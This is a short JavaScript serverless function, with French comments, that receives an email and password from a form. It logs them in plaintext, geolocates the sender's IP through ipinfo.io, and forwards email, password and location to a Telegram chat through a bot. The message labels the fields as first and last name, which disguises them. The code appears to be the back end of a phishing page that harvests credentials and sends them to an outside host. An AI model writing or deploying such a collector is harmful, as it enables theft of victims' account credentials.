export async function handler(event) {
  if (event.httpMethod !== "POST") {
    return {
      statusCode: 405,
      body: "Method Not Allowed",
    };
  }

  try {
    // Extraction des données du corps de la requête
    const { email, motDePasse } = JSON.parse(event.body);
    console.log("Données reçues:", { email, motDePasse });

    if (!email || !motDePasse) {
      return {
        statusCode: 400,
        body: JSON.stringify({ error: "Champs manquants" }),
      };
    }

    // Récupérer l'adresse IP de la requête
    const ip = event.headers["x-forwarded-for"] || event.headers["X-Forwarded-For"];
    console.log("IP reçue:", ip);

    // Utilisation de l'API ipinfo.io pour obtenir la localisation (IP -> Géolocalisation)
    const locationResponse = await fetch(`https://ipinfo.io/${ip}/json?token=TON_API_KEY`);
    const locationData = await locationResponse.json();

    // Extraire la ville, pays et l'IP
    const { city, country } = locationData;
    const ipLocation = `${ip} (${city}, ${country})`;

    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    const message = `
📩 Nouveau formulaire
🌍 IP : ${ipLocation}
👤 Nom : ${email}
👤 Prénom : ${motDePasse}
    `;

    const response = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
        }),
      }
    );

    const data = await response.json();
    console.log("Réponse de Telegram:", data);

    if (!response.ok) {
      throw new Error("Erreur Telegram");
    }

    return {
      statusCode: 200,
      body: JSON.stringify({ success: true }),
    };

  } catch (err) {
    console.error("Erreur dans la fonction:", err);
    return {
      statusCode: 500,
      body: JSON.stringify({ error: err.message }),
    };
  }
}

